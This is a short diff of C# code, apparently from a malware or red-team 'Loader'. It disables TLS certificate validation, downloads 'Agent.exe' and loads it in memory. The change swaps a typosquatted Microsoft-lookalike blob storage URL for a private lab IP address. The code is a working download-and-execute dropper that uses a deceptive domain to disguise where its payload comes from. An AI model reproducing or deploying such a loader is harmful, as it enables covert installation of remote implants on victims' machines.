@@ -24,7 +24,7 @@ namespace Loader
         {
             if (!HelloTest()) { return; }
             ServicePointManager.ServerCertificateValidationCallback = (a, b, c, d) => true;
-            var data = DownloadAttemptOne("https://microsftpublic001.blob.core.windows.net/pub/Agent.exe");
+            var data = DownloadAttemptOne("http://192.168.56.102:9000/Agent.exe");
             if (data == null) { return; }
             if (!LoadAttemptOne(data)) { return; }
         }
